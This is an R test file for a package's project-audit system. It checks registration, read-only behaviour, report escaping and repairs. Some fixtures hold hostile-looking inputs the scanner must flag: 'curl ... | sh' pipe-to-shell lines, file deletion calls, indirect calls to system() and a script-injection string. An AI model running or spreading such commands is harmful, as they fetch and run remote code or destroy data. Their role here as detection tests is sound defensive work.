test_that("every specified check ID has a complete registered definition", {
  required_ids <- c(sprintf("INS-%03d", 1:4), sprintf("KB-%03d", 1:5), sprintf("PRJ-%03d", 1:6), sprintf("INT-%03d", 1:3))
  checks <- audit_checks()
  expect_true(all(required_ids %in% names(checks)))
  expect_true(all(c("PRJ-007", "PRJ-008", "RES-001", "RES-002") %in% names(checks)))
  for (check in checks) {
    expect_s3_class(check, "cttir_audit_check")
    expect_true(check$scope %in% audit_scope_levels)
    expect_true(is.function(check$run))
    expect_true(is.function(check$required) || (is.logical(check$required) && length(check$required) == 1L))
    expect_true(all(check$read_effects %in% audit_effect_levels))
    expect_gt(check$timeout_seconds, 0)
    expect_true(is.null(check$repair_id) || check$repair_id %in% names(audit_repairs()))
    # Only integration checks may write, and only temporary files.
    expect_identical("writes_temp_files" %in% check$read_effects, check$scope == "integration" && check$id != "INT-003")
  }
  expect_equal(checks[["PRJ-002"]]$repair_id, "restore_missing_managed")
  expect_equal(checks[["PRJ-007"]]$repair_id, "recover_interrupted_transaction")
  expect_equal(checks[["KB-001"]]$repair_id, "repoint_active_catalog")
  expect_named(audit_repairs(), c("recover_interrupted_transaction", "restore_missing_managed", "repoint_active_catalog"))
  expect_true(all(vapply(audit_checks("knowledge"), function(x) x$scope, character(1)) == "knowledge"))
})

test_that("extra checks register for the session and invalid definitions are refused", {
  check <- audit_check("XTR-001", "installation", "Synthetic registered check.",
    function(context) audit_result("warning", "Synthetic finding.", list(source = "test")), required = FALSE)
  register_audit_check(check)
  withr::defer(unregister_audit_check("XTR-001"))
  expect_error(register_audit_check(check), class = "cttir_schema_error")
  expect_silent(register_audit_check(check, replace = TRUE))
  builtin <- audit_check("INS-001", "installation", "Shadow attempt.", function(context) audit_result("pass", "x"))
  expect_error(register_audit_check(builtin), class = "cttir_schema_error")
  report <- audit(scope = "installation")
  row <- report$checks[report$checks$id == "XTR-001", ]
  expect_equal(row$status, "warning")
  expect_false(row$required)
  expect_equal(jsonlite::fromJSON(row$evidence)$source, "test")
  expect_false("XTR-001" %in% audit(scope = "knowledge")$checks$id)
  run <- function(context) audit_result("pass", "x")
  expect_error(audit_check("bad", "installation", "x", run), class = "cttir_schema_error")
  expect_error(audit_check("XTR-002", "elsewhere", "x", run), class = "cttir_schema_error")
  expect_error(audit_check("XTR-002", "installation", "x", run, read_effects = "network"), class = "cttir_schema_error")
  expect_error(audit_check("XTR-002", "installation", "x", run, repair_id = "delete_everything"), class = "cttir_schema_error")
  expect_error(audit_check("XTR-002", "installation", "x", run, timeout_seconds = 0), class = "cttir_schema_error")
  expect_error(audit_check("XTR-002", "installation", "x", "not a function"), class = "cttir_schema_error")
  expect_error(register_audit_check(list(id = "XTR-003")), class = "cttir_input_error")
})

test_that("a check that errors or returns garbage is reported, not propagated", {
  erroring <- function(context) stop("unexpected internal error")
  garbage <- function(context) list(status = "great")
  register_audit_check(audit_check("XTR-004", "installation", "Erroring check.", erroring, required = FALSE))
  register_audit_check(audit_check("XTR-005", "installation", "Invalid result.", garbage, required = FALSE))
  withr::defer({
    unregister_audit_check("XTR-004")
    unregister_audit_check("XTR-005")
  })
  report <- audit(scope = "installation")
  expect_equal(report$checks$status[report$checks$id == "XTR-004"], "fail")
  expect_equal(report$checks$message[report$checks$id == "XTR-004"], "Integrity check failed.")
  expect_equal(report$checks$status[report$checks$id == "XTR-005"], "fail")
  expect_equal(report$overall_status, "warning")
})

test_that("default audit leaves project, catalog store and runtime state byte-identical", {
  f <- local_update_fixture()
  update()
  runtime <- file.path(f$parent, "runtime")
  dir.create(runtime)
  writeLines("{}", file.path(runtime, "unrelated.json"))
  withr::local_options(cttiR.runtime_dir = runtime)
  p <- project("Read effects", "methods", "Goal", f$parent)
  if (nzchar(Sys.which("git"))) processx::run("git", c("init", "-q", p$path))
  before <- list(project = tree_state(p$path), store = tree_state(f$store), runtime = tree_state(runtime))
  report <- audit(p$path)
  expect_identical(list(project = tree_state(p$path), store = tree_state(f$store), runtime = tree_state(runtime)), before)
  expect_s3_class(report, "cttir_audit")
  expect_false(report$overall_status %in% c("fail", "not_tested"))
  expect_true(all(report$checks$status[report$checks$required] %in% c("pass", "not_applicable")))
  expect_false(any(c("writes_temp_files", "writes_reports", "applies_repairs", "local_http_metadata") %in% report$effects))
  expect_equal(report$checks$status[report$checks$id == "KB-003"], "pass")
  expect_length(report$repairs, 0L)
  expect_equal(report$path, normalizePath(p$path, winslash = "/"))
  expect_equal(report$package$version, as.character(utils::packageVersion("cttiR")))
  expect_true(all(c("severity", "evidence", "description", "read_effects", "repair_id") %in% names(report$checks)))
  for (json in report$checks$evidence) expect_no_error(jsonlite::fromJSON(json))
  doctor(p$path)
  expect_identical(list(project = tree_state(p$path), store = tree_state(f$store), runtime = tree_state(runtime)), before)
})

test_that("audit reads data registry metadata without dereferencing bound paths", {
  parent <- new_parent()
  source <- list(id = "cohort", label = "Cohort", logical_uri = "registry:cohort", format = "csv",
    access_class = "restricted", checksum = NULL, checksum_status = "unknown", schema_ref = NULL)
  p <- project("Bound data", "primary_research", "Goal", parent, options = list(data_sources = list(source)))
  secret <- file.path(parent, "outside", "secret-raw.csv")
  writeLines(c("bindings:", "  - dataset_id: cohort", paste0("    path: ", secret)), file.path(p$path, ".cttir/local.yml"))
  report <- audit(p$path, scope = "project")
  row <- report$checks[report$checks$id == "PRJ-005", ]
  expect_equal(row$status, "pass")
  expect_false(grepl(secret, paste(row$message, row$evidence), fixed = TRUE))
  writeLines(c("bindings:", "  - dataset_id: unknown_set", "    path: /mnt/archive/raw.csv"), file.path(p$path, ".cttir/local.yml"))
  registry <- file.path(p$path, "metadata/data-registry.yml")
  writeLines(c("datasets:", "  - id: cohort", "    label: Cohort", "    logical_uri: /mnt/archive/cohort.csv", "    extra_field: x"), registry)
  row <- audit(p$path, scope = "project")$checks
  row <- row[row$id == "PRJ-005", ]
  expect_equal(row$status, "warning")
  evidence <- jsonlite::fromJSON(row$evidence)
  expect_equal(evidence$unbound_references, "unknown_set")
  expect_equal(evidence$machine_uris, 1L)
  expect_equal(evidence$unknown_keys, "extra_field")
  expect_false(grepl("/mnt/archive", paste(row$message, row$evidence), fixed = TRUE))
  writeLines("datasets: 12", registry)
  row <- audit(p$path, scope = "project")$checks
  expect_equal(row$status[row$id == "PRJ-005"], "fail")
})

test_that("tracked private paths are found from Git file names only", {
  skip_if(!nzchar(Sys.which("git")), "Git is unavailable")
  parent <- new_parent()
  p <- project("Tracked", "methods", "Goal", parent)
  processx::run("git", c("init", "-q", p$path))
  dir.create(file.path(p$path, "data/raw"), recursive = TRUE)
  writeLines("id,value", file.path(p$path, "data/raw/participants.csv"))
  processx::run("git", c("-C", p$path, "add", "-f", "data/raw/participants.csv", ".cttir/local.yml"))
  before <- tree_state(p$path)
  report <- audit(p$path, scope = "project")
  expect_identical(tree_state(p$path), before)
  row <- report$checks[report$checks$id == "PRJ-006", ]
  expect_equal(row$status, "warning")
  expect_setequal(jsonlite::fromJSON(row$evidence)$tracked, c("data/raw/participants.csv", ".cttir/local.yml"))
  expect_false(row$required)
  writeLines("data/raw/", file.path(p$path, ".gitignore"))
  row <- audit(p$path, scope = "project")$checks
  expect_contains(jsonlite::fromJSON(row$evidence[row$id == "PRJ-006"])$missing_ignores, ".cttir/local.yml")
})

test_that("reports are added under unique names and never overwrite files", {
  parent <- new_parent()
  p <- project("Reports", "methods", "Goal", parent)
  out <- file.path(parent, "audit-reports")
  dir.create(out)
  writeLines("keep", file.path(out, "existing.md"))
  before <- tree_state(p$path)
  a <- audit(p$path, scope = "project", output = out)
  expect_identical(tree_state(p$path), before)
  expect_length(a$reports, 2L)
  expect_setequal(list.files(out), c("existing.md", basename(a$reports)))
  json <- jsonlite::fromJSON(a$reports[[1]], simplifyVector = FALSE)
  expect_equal(json$overall_status, a$overall_status)
  expect_equal(json$schema_version, 2L)
  expect_equal(unlist(json$reports), basename(a$reports))
  kept <- tree_state(out)
  b <- audit(p$path, scope = "project", output = out)
  expect_length(list.files(out), 5L)
  expect_identical(tree_state(out)[names(kept)], kept)
  existing <- sub("[.]json$", "", basename(a$reports[[1]]))
  stems <- c(existing, "cttir-audit-fresh")
  local_mocked_bindings(audit_report_stem = function() {
    stem <- stems[[1]]
    if (length(stems) > 1L) stems <<- stems[-1]
    stem
  })
  c <- audit(p$path, scope = "project", output = out)
  expect_equal(basename(c$reports), c("cttir-audit-fresh.json", "cttir-audit-fresh.md"))
  expect_identical(tree_state(out)[names(kept)], kept)
  stems <- existing
  expect_error(audit(p$path, scope = "project", output = out), class = "cttir_path_conflict")
  expect_error(audit(p$path, output = file.path(out, "existing.md")), class = "cttir_path_conflict")
})

test_that("reports escape Markdown and replace project and home paths", {
  parent <- new_parent()
  p <- project("Portable", "methods", "Goal", parent)
  home <- path.expand("~")
  register_audit_check(audit_check("XTR-006", "project", "Synthetic hostile message.", function(context) {
    root <- audit_root(context)
    audit_result("warning", paste0(
      "Row | break <script>alert(1)</script> [link](https://example.org)\nnext line ",
      file.path(root, "code", "x.R"), " and ", file.path(home, "secret", "data.csv"), " root ", root
    ), list(file = file.path(root, "data", "raw", "x.csv")))
  }, required = FALSE, applies = audit_has_path, read_effects = "reads_project_metadata"))
  withr::defer(unregister_audit_check("XTR-006"))
  out <- file.path(parent, "reports")
  a <- audit(p$path, scope = "project", output = out)
  md <- readLines(a$reports[[2]], encoding = "UTF-8")
  json <- paste(readLines(a$reports[[1]], encoding = "UTF-8"), collapse = "\n")
  text <- paste(c(md, json), collapse = "\n")
  row <- grep("^\\| XTR-006 \\|", md, value = TRUE)
  expect_length(row, 1L)
  expect_false(grepl("<script>", paste(md, collapse = "\n"), fixed = TRUE))
  expect_match(row, "&lt;script&gt;", fixed = TRUE)
  expect_match(row, "Row \\| break", fixed = TRUE)
  expect_match(row, "\\[link\\]", fixed = TRUE)
  expect_equal(lengths(regmatches(row, gregexpr("(?<!\\\\)\\|", row, perl = TRUE))), 6L)
  expect_match(row, "next line code/x.R", fixed = TRUE)
  expect_false(grepl(p$path, text, fixed = TRUE))
  expect_match(json, "data/raw/x.csv", fixed = TRUE)
  expect_match(json, "\"path\": \".\"", fixed = TRUE)
  if (nchar(home) > 1L && !startsWith(p$path, home)) {
    expect_false(grepl(home, text, fixed = TRUE))
    expect_match(row, "~/secret/data.csv", fixed = TRUE)
  }
  expect_equal(a$path, normalizePath(p$path, winslash = "/"))
  expect_match(a$checks$message[a$checks$id == "XTR-006"], p$path, fixed = TRUE)
  # Only whole path components are replaced, never a longer sibling name.
  expect_equal(audit_redact(c("/r/proj/x", "/r/proj", "/r/project2/y", "\"/r/proj\""), "/r/proj"),
    c("x", ".", "/r/project2/y", "\".\""))
})

test_that("integration scope creates and removes its own temporary files", {
  f <- local_update_fixture()
  update()
  sources <- getOption("cttiR.sources")
  store <- tree_state(f$store)
  temporary <- list.files(tempdir(), all.files = TRUE, no.. = TRUE)
  report <- audit(scope = "integration")
  expect_equal(report$checks$status, c("pass", "pass", "not_applicable"))
  expect_equal(report$overall_status, "pass")
  expect_contains(report$effects, "writes_temp_files")
  expect_identical(list.files(tempdir(), all.files = TRUE, no.. = TRUE), temporary)
  expect_identical(tree_state(f$store), store)
  expect_identical(getOption("cttiR.sources"), sources)
  expect_identical(getOption("cttiR.catalog_dir"), f$store)
  local_mocked_bindings(rollback_knowledge = function(...) stop("injected rollback failure"))
  failed <- audit(scope = "integration")
  expect_equal(failed$checks$status[failed$checks$id == "INT-002"], "fail")
  expect_equal(failed$overall_status, "fail")
  expect_identical(list.files(tempdir(), all.files = TRUE, no.. = TRUE), temporary)
  expect_identical(tree_state(f$store), store)
  expect_identical(getOption("cttiR.catalog_dir"), f$store)
})

test_that("doctor never repairs and uses the shared engine", {
  parent <- new_parent()
  p <- project("Doctor", "methods", "Goal", parent)
  unlink(file.path(p$path, "code/validate_project.R"))
  before <- tree_state(p$path)
  d <- doctor(p$path)
  expect_identical(tree_state(p$path), before)
  expect_length(d$repairs, 0L)
  expect_false(d$repair_requested)
  expect_equal(d$checks$status[d$checks$id == "PRJ-002"], "fail")
  expect_equal(d$overall_status, "fail")
  expect_identical(d$checks$id, audit(p$path)$checks$id)
})

test_that("overall status follows the documented precedence", {
  rows <- function(status, required) data.frame(id = paste0("X-", seq_along(status)), status = status, required = required)
  expect_equal(audit_overall(rows(c("pass", "fail"), c(TRUE, TRUE))), "fail")
  expect_equal(audit_overall(rows(c("not_tested", "fail"), c(TRUE, TRUE))), "fail")
  expect_equal(audit_overall(rows(c("pass", "not_tested"), c(TRUE, TRUE))), "not_tested")
  expect_equal(audit_overall(rows(c("pass", "fail"), c(TRUE, FALSE))), "warning")
  expect_equal(audit_overall(rows(c("pass", "not_tested"), c(TRUE, FALSE))), "warning")
  expect_equal(audit_overall(rows(c("pass", "warning"), c(TRUE, TRUE))), "warning")
  expect_equal(audit_overall(rows(c("pass", "not_applicable"), c(TRUE, TRUE))), "pass")
  expect_equal(audit_overall(rows(c("not_applicable", "not_applicable"), c(TRUE, FALSE))), "not_tested")
  expect_match(audit_overall_reason(rows(c("not_applicable", "not_applicable"), c(TRUE, FALSE))), "nothing was verified")
  expect_equal(unique(audit(scope = "knowledge")$checks$scope), "knowledge")
  expect_equal(audit(scope = c("installation", "installation"))$scopes, "installation")
})

test_that("strict mode throws only for required failures or unverified checks, after reporting", {
  cases <- list(
    list(status = "pass", required = TRUE, overall = "pass", throws = FALSE),
    list(status = "warning", required = TRUE, overall = "warning", throws = FALSE),
    list(status = "fail", required = FALSE, overall = "warning", throws = FALSE),
    list(status = "not_tested", required = FALSE, overall = "warning", throws = FALSE),
    list(status = "fail", required = TRUE, overall = "fail", throws = TRUE),
    list(status = "not_tested", required = TRUE, overall = "not_tested", throws = TRUE),
    list(status = "not_applicable", required = TRUE, overall = "not_tested", throws = TRUE)
  )
  for (case in cases) {
    synthetic <- audit_check("SYN-001", "installation", "Synthetic.",
      function(context) audit_result(case$status, "Synthetic."), required = case$required)
    local_mocked_bindings(audit_check_providers = function() list(function() list(synthetic)))
    out <- tempfile("strict-")
    withr::defer(unlink(out, recursive = TRUE))
    if (case$throws) {
      error <- tryCatch(audit(scope = "installation", strict = TRUE, output = out), error = identity)
      expect_s3_class(error, "cttir_audit_failed")
      expect_equal(error$code, "audit_failed")
      expect_equal(error$report$overall_status, case$overall)
      expect_equal(error$field, if (case$status == "not_applicable") character() else "SYN-001")
      expect_length(list.files(out), 2L)
      expect_setequal(basename(error$report$reports), list.files(out))
    } else {
      result <- audit(scope = "installation", strict = TRUE, output = out)
      expect_equal(result$overall_status, case$overall)
      expect_length(list.files(out), 2L)
    }
  }
})

test_that("missing-file repair is idempotent and a failed repair preserves prior bytes", {
  parent <- new_parent()
  p <- project("Repair twice", "methods", "Goal", parent)
  target <- file.path(p$path, "code/validate_project.R")
  baseline <- file_hash(target)
  unlink(target)
  before <- tree_state(p$path)
  failed <- with_mocked_bindings(
    audit(p$path, scope = "project", repair = TRUE),
    replace_file = function(from, to) stop("injected write failure")
  )
  expect_identical(tree_state(p$path), before)
  expect_equal(failed$repairs[[1]]$id, "restore_missing_managed")
  expect_equal(failed$repairs[[1]]$status, "failed")
  expect_identical(failed$repairs[[1]]$before, failed$repairs[[1]]$after)
  expect_equal(failed$overall_status, "fail")
  repaired <- audit(p$path, scope = "project", repair = TRUE)
  record <- repaired$repairs[[1]]
  expect_equal(record$status, "applied")
  expect_true(is.na(record$before[["code/validate_project.R"]]))
  expect_equal(record$after[["code/validate_project.R"]], baseline)
  expect_equal(record$recheck[["PRJ-002"]], "pass")
  expect_equal(repaired$checks$status[repaired$checks$id == "PRJ-002"], "pass")
  expect_contains(repaired$effects, "applies_repairs")
  state <- tree_state(p$path)
  again <- audit(p$path, scope = "project", repair = TRUE)
  expect_length(again$repairs, 0L)
  expect_identical(tree_state(p$path), state)
})

test_that("interrupted-write repair is idempotent and a failed rollback restores every byte", {
  skip_if_not_installed("callr")
  parent <- new_parent()
  p <- project("Recover twice", "methods", "Goal", parent)
  paths <- c("code/validate_project.R", "README.md")
  baseline <- vapply(paths, function(x) file_hash(file.path(p$path, x)), character(1))
  interrupted_write(p$path, dead_pid(), paths)
  before <- tree_state(p$path)
  plain <- audit(p$path, scope = "project")
  expect_identical(tree_state(p$path), before)
  expect_equal(plain$checks$status[plain$checks$id %in% c("PRJ-007", "PRJ-008")], c("fail", "warning"))
  calls <- 0L
  real <- replace_file
  failed <- with_mocked_bindings(
    audit(p$path, scope = "project", repair = TRUE),
    replace_file = function(from, to) {
      calls <<- calls + 1L
      if (calls == 2L) stop("injected failure during recovery")
      real(from, to)
    }
  )
  expect_equal(calls, 2L)
  expect_equal(failed$repairs[[1]]$id, "recover_interrupted_transaction")
  expect_equal(failed$repairs[[1]]$status, "failed")
  expect_identical(tree_state(p$path), before)
  repaired <- audit(p$path, scope = "project", repair = TRUE)
  expect_equal(repaired$repairs[[1]]$status, "applied")
  expect_equal(unlist(repaired$repairs[[1]]$after[paths]), baseline)
  expect_equal(repaired$repairs[[1]]$recheck[["PRJ-007"]], "pass")
  expect_false(dir.exists(file.path(p$path, ".cttir/write-lock")))
  expect_false(dir.exists(file.path(p$path, ".cttir/recovery-lock")))
  expect_length(pending_transactions(p$path), 0L)
  state <- tree_state(p$path)
  expect_length(audit(p$path, scope = "project", repair = TRUE)$repairs, 0L)
  expect_identical(tree_state(p$path), state)
})

test_that("a corrupt active pointer is repointed to the last verified manifest under the lock", {
  f <- local_update_fixture()
  first <- update()
  writeLines(c("keep <- function(x = 3) x", "added <- function() 1"), file.path(f$source, "R", "api.R"))
  writeLines(c("export(keep)", "export(added)"), file.path(f$source, "NAMESPACE"))
  second <- update()
  manifests <- file.path(f$store, "manifests", paste0(c(first$previous_id, first$new_id, second$new_id), ".json"))
  Sys.setFileTime(manifests, Sys.time() - c(300, 200, 100))
  writeLines("broken", file.path(f$store, "active.json"))
  before <- tree_state(f$store)
  plain <- audit(scope = "knowledge")
  expect_equal(plain$checks$status[plain$checks$id == "KB-001"], "fail")
  expect_identical(tree_state(f$store), before)
  failed <- with_mocked_bindings(audit(scope = "knowledge", repair = TRUE),
    file_move = function(...) stop("injected move failure"), .package = "fs")
  expect_equal(failed$repairs[[1]]$id, "repoint_active_catalog")
  expect_equal(failed$repairs[[1]]$status, "failed")
  expect_identical(tree_state(f$store), before)
  late <- with_mocked_bindings(audit(scope = "knowledge", repair = TRUE),
    file_move = function(path, new_path) {
      file.rename(path, new_path)
      stop("injected failure after the pointer moved")
    }, .package = "fs")
  expect_equal(late$repairs[[1]]$status, "failed")
  expect_identical(tree_state(f$store), before)
  repaired <- audit(scope = "knowledge", repair = TRUE)
  record <- repaired$repairs[[1]]
  expect_equal(record$status, "applied")
  expect_equal(record$recheck[["KB-001"]], "pass")
  expect_equal(repaired$overall_status, "warning")
  expect_equal(current_catalog_manifest()$manifest_id, second$new_id)
  after <- tree_state(f$store)
  unchanged <- setdiff(names(before), "active.json")
  expect_identical(after[unchanged], before[unchanged])
  expect_true(all(startsWith(setdiff(names(after), names(before)), "repairs")))
  journal <- read_document(file.path(record$journal, "journal.json"))
  expect_equal(journal$status, "committed")
  expect_equal(readLines(file.path(record$journal, "active.json.before")), "broken")
  expect_length(audit(scope = "knowledge", repair = TRUE)$repairs, 0L)
  expect_identical(tree_state(f$store), after)
})

test_that("pointer repair is skipped while a catalog writer lock exists", {
  f <- local_update_fixture()
  update()
  writeLines("broken", file.path(f$store, "active.json"))
  dir.create(file.path(f$store, "write-lock"))
  write_bytes(json_text(list(pid = Sys.getpid(), host = Sys.info()[["nodename"]])), file.path(f$store, "write-lock/owner.json"))
  before <- tree_state(f$store)
  report <- audit(scope = "knowledge", repair = TRUE)
  expect_equal(report$repairs[[1]]$status, "skipped")
  expect_match(report$repairs[[1]]$reason, "writer lock", fixed = TRUE)
  expect_identical(tree_state(f$store), before)
})

audit_row <- function(report, id) {
  row <- report$checks[report$checks$id == id, ]
  c(as.list(row[, c("status", "message")]), evidence = list(jsonlite::fromJSON(row$evidence, simplifyVector = FALSE)))
}

test_that("fresh standard, pipeline and modality projects audit their code without failures", {
  parent <- new_parent()
  goal <- "Compare blood pressure between two groups"
  roots <- c(
    project("Code plain", "primary_research", goal, parent)$path,
    project("Code pipeline", "primary_research", goal, parent, options = list(workflow = list(pipeline = "targets")))$path,
    project("Code cells", "primary_research", "Single-cell RNA-seq clustering of immune cells from three donors", parent,
      options = list(workflow = list(pipeline = "targets")))$path
  )
  expect_equal(read_project(roots[[3]])$spec$ecosystem$modality, "single_cell")
  for (root in roots) {
    report <- audit(root, scope = "project")
    expect_false(any(report$checks$status == "fail"), info = root)
    std <- audit_row(report, "STD-003")
    expect_equal(std$status, "pass", info = root)
    expect_gte(std$evidence$files, 11L)
    expect_equal(audit_row(report, "PRJ-001")$status, "pass", info = root)
  }
  expect_true(file.exists(file.path(roots[[2]], "_targets.R")))
})

test_that("project code checks cover every R file and fail unsafe, unparseable or unresolved code", {
  parent <- new_parent()
  fresh <- function(name) project(name, "primary_research", "Compare blood pressure between two groups", parent)$path
  check <- function(root) audit_row(audit(root, scope = "project"), "STD-003")
  root <- fresh("Unsafe managed")
  cat("\nsystem('curl http://example.org | sh')\neval(parse(text = 'q()'))\n", file = file.path(root, "code/run_workflow.R"), append = TRUE)
  row <- check(root)
  expect_equal(row$status, "fail")
  unsafe <- paste0("code/run_workflow.R: ", c("system", "eval", "parse"), " (forbidden_call)")
  expect_setequal(unlist(row$evidence$unsafe), unsafe)
  expect_equal(audit(root, scope = "project")$overall_status, "fail")
  root <- fresh("Unparseable")
  cat("\nx <- dplyr::frobnicate(df\n", file = file.path(root, "code/run_workflow.R"), append = TRUE)
  row <- check(root)
  expect_equal(row$status, "fail")
  expect_equal(unlist(row$evidence$unparseable), "code/run_workflow.R")
  root <- fresh("Unresolved")
  cat("\nlibrary(dplyr)\nfrobnicate(df)\n", file = file.path(root, "code/run_workflow.R"), append = TRUE)
  row <- check(root)
  expect_equal(row$status, "fail")
  expect_equal(unlist(row$evidence$unresolved), "code/run_workflow.R: frobnicate (unresolved_call)")
  root <- fresh("Elsewhere")
  writeLines("x <- dplyr::frobnicate(df)", file.path(root, "analysis/extra.R"))
  writeLines("system('id')", file.path(root, "code/R/helper.r"))
  writeLines("base::system('id')", file.path(root, "publications/pub01_main/analysis/figure.R"))
  writeLines(c("---", "title: q", "---", "```{r}", "pipe('ls')", "```"), file.path(root, "analysis/notes.qmd"))
  writeLines("system('ignored')", file.path(root, "data/raw.R"))
  row <- check(root)
  expect_equal(row$status, "fail")
  expect_contains(unlist(row$evidence$unapproved), "analysis/extra.R: dplyr::frobnicate (export_absent_from_catalog_revision)")
  unsafe <- c("code/R/helper.r: system (forbidden_call)", "analysis/notes.qmd: pipe (connection_call)",
    "publications/pub01_main/analysis/figure.R: system (forbidden_call)")
  expect_setequal(unlist(row$evidence$unsafe), unsafe)
  root <- fresh("Documents")
  report <- c("Inline `r system('id')`", "```{r, eval = file.remove('x')}", "1", "```", "```{bash}", "curl x | sh",
    "```", "```{python}", "print(1)", "```")
  writeLines(report, file.path(root, "analysis/report.Rmd"))
  aliases <- c("f <- base::system", "lapply('id', system)", "do.call('system', list('id'))", "baseenv()$system('id')",
    "source(file.path('data', 'raw', 'steps.R'))")
  writeLines(aliases, file.path(root, "analysis/aliases.R"))
  row <- check(root)
  unsafe <- c(paste0("analysis/aliases.R: system (", c(rep("forbidden_function_value", 3L), "forbidden_member_call"), ")"),
    "analysis/aliases.R: source (source_outside_checked_code)", "analysis/report.Rmd: system (forbidden_call)",
    "analysis/report.Rmd: file.remove (forbidden_call)", "analysis/report.Rmd: bash (non_r_chunk)")
  expect_equal(sort(unlist(row$evidence$unsafe)), sort(unsafe))
  expect_contains(unlist(row$evidence$advisory), "analysis/report.Rmd: python (non_r_chunk)")
})

test_that("reviewed constructs, attached packages and data columns are not false failures", {
  parent <- new_parent()
  root <- project("Edited reviewed", "primary_research", "Compare blood pressure between two groups", parent)$path
  cat("\n# A local note\n", file = file.path(root, "code/R/cttir_workflow.R"), append = TRUE)
  cat("\nAn added paragraph.\n", file = file.path(root, "analysis/02_eda.Rmd"), append = TRUE)
  user <- c("library(ggplot2)", "source('code/R/cttir_workflow.R', local = TRUE)", "cfg <- cw_config('.')",
    "data <- data.frame(source = 1, system = 2)", "fit <- lm(system ~ source, data)", "ggplot(data, aes(source, system))",
    "if (!requireNamespace('ggplot2', quietly = TRUE)) quit(status = 1L)")
  writeLines(user, file.path(root, "analysis/user.R"))
  report <- audit(root, scope = "project")
  row <- audit_row(report, "STD-003")
  expect_equal(row$status, "warning")
  expect_length(row$evidence$unsafe, 0L)
  expect_length(row$evidence$unresolved, 0L)
  advisory <- c("ggplot (attached_package_call)", "aes (attached_package_call)", "source (forbidden_name_reference)",
    "system (forbidden_name_reference)")
  advisory <- paste0("analysis/user.R: ", advisory)
  expect_setequal(unlist(row$evidence$advisory), advisory)
  expect_equal(audit_row(report, "STD-002")$status, "warning")
  expect_false(report$overall_status %in% c("fail", "not_tested"))
  cat("\nunlink('analysis', recursive = TRUE)\n", file = file.path(root, "code/R/cttir_workflow.R"), append = TRUE)
  row <- audit_row(audit(root, scope = "project"), "STD-003")
  expect_equal(unlist(row$evidence$unsafe), "code/R/cttir_workflow.R: unlink (forbidden_call)")
})

test_that("hand-edited control metadata fails like an identical project() repeat", {
  parent <- new_parent()
  goal <- "Compare blood pressure between two groups"
  root <- project("Lock edit", "primary_research", goal, parent)$path
  lock <- file.path(root, "cttir-lock.json")
  lines <- readLines(lock)
  pin <- grep('"version": "1.1-3"', lines, fixed = TRUE)[[1]]
  lines[[pin]] <- sub("1.1-3", "9.9-9", lines[[pin]], fixed = TRUE)
  writeLines(lines, lock)
  expect_error(project("Lock edit", "primary_research", goal, parent), class = "cttir_path_conflict")
  report <- audit(root, scope = "project")
  row <- audit_row(report, "PRJ-001")
  expect_equal(row$status, "fail")
  expect_equal(unlist(row$evidence$changed_control_files), "cttir-lock.json")
  expect_equal(report$overall_status, "fail")
  root <- project("Manifest edit", "primary_research", goal, parent)$path
  code <- file.path(root, "code/R/cttir_workflow.R")
  cat("\nmessage('changed')\n", file = code, append = TRUE)
  manifest <- jsonlite::read_json(file.path(root, ".cttir/managed-files.json"))
  for (i in seq_along(manifest$files)) {
    if (manifest$files[[i]]$path == "code/R/cttir_workflow.R") manifest$files[[i]]$baseline_sha256 <- file_hash(code)
  }
  writeLines(jsonlite::toJSON(manifest, auto_unbox = TRUE, pretty = TRUE), file.path(root, ".cttir/managed-files.json"))
  report <- audit(root, scope = "project")
  expect_equal(audit_row(report, "PRJ-002")$status, "pass")
  expect_equal(audit_row(report, "PRJ-001")$status, "fail")
  expect_equal(report$overall_status, "fail")
  root <- project("Synced", "primary_research", goal, parent)$path
  source <- list(id = "cohort", label = "Cohort", logical_uri = "registry:cohort", format = "csv",
    access_class = "restricted", checksum = NULL, checksum_status = "unknown", schema_ref = NULL)
  expect_equal(sync(root, options = list(data_sources = list(source), workflow = list(pipeline = "targets")), dry_run = FALSE)$state, "applied")
  expect_equal(audit_row(audit(root, scope = "project"), "PRJ-001")$status, "pass")
})

test_that("project checks report a missing pinned snapshot instead of using the active catalog", {
  f <- local_update_fixture()
  update()
  p <- project("Pinned elsewhere", "primary_research", "Compare blood pressure between two groups", f$parent)
  pinned <- read_project(p$path)$lock$catalog_id
  writeLines(c("keep <- function(x = 3) x", "added <- function() 1"), file.path(f$source, "R", "api.R"))
  writeLines(c("export(keep)", "export(added)"), file.path(f$source, "NAMESPACE"))
  update()
  expect_false(identical(resolve_catalog()$content_id, pinned))
  expect_equal(audit(p$path, scope = "project")$overall_status, "warning")
  unlink(file.path(f$store, "snapshots", pinned), recursive = TRUE)
  report <- audit(p$path, scope = "project")
  for (id in c("STD-001", "STD-003", "STD-005", "PRJ-004")) {
    expect_equal(audit_row(report, id)$status, "fail", info = id)
    expect_match(audit_row(report, id)$message, "snapshot is unavailable", fixed = TRUE, info = id)
  }
  expect_equal(audit_row(report, "PRJ-001")$status, "not_tested")
  expect_equal(report$overall_status, "fail")
})

test_that("the resource JSON mirror is compared row by row, not only by counts", {
  parity <- resource_json_parity()
  expect_true(parity$hash_matches)
  expect_length(parity$mismatched_tables, 0L)
  expect_gt(parity$rows, 7000L)
  copy <- tempfile(fileext = ".sqlite")
  withr::defer(unlink(copy))
  file.copy(resource_file("extdata", "package-resources.sqlite"), copy)
  con <- DBI::dbConnect(RSQLite::SQLite(), copy)
  DBI::dbExecute(con, "UPDATE packages SET purpose = 'Altered' WHERE name = 'dplyr'")
  DBI::dbExecute(con, "UPDATE dependencies SET version_constraint = '>= 99' WHERE rowid = 1")
  DBI::dbExecute(con, "UPDATE catalog_metadata SET value_json = '2' WHERE key = 'schema_version'")
  DBI::dbExecute(con, "DELETE FROM profile_packages WHERE rowid = 1")
  DBI::dbDisconnect(con)
  altered <- resource_json_parity(database = copy)
  expect_setequal(unlist(altered$mismatched_tables), c("packages", "dependencies", "catalog_metadata", "profile_packages"))
  local_mocked_bindings(resource_json_parity = function(...) altered)
  report <- audit(scope = "knowledge")
  expect_equal(report$checks$status[report$checks$id == "RES-001"], "fail")
})

test_that("RES-007 enforces the Bioconductor release of a project's pins against the running R", {
  parent <- new_parent()
  tabular <- project("Tabular pins", "primary_research", "Describe outcomes in a cohort", parent)
  expect_equal(audit_res_bioc_pins(audit_context(tabular$path, "project", FALSE, FALSE))$status, "not_applicable")
  cells <- project("Cell pins", "primary_research", "Single-cell RNA-seq of PBMC donors", parent)
  pins <- Filter(function(d) !is.null(d$bioc_release), read_project(cells$path)$lock$dependencies)
  expect_gt(length(pins), 0L)
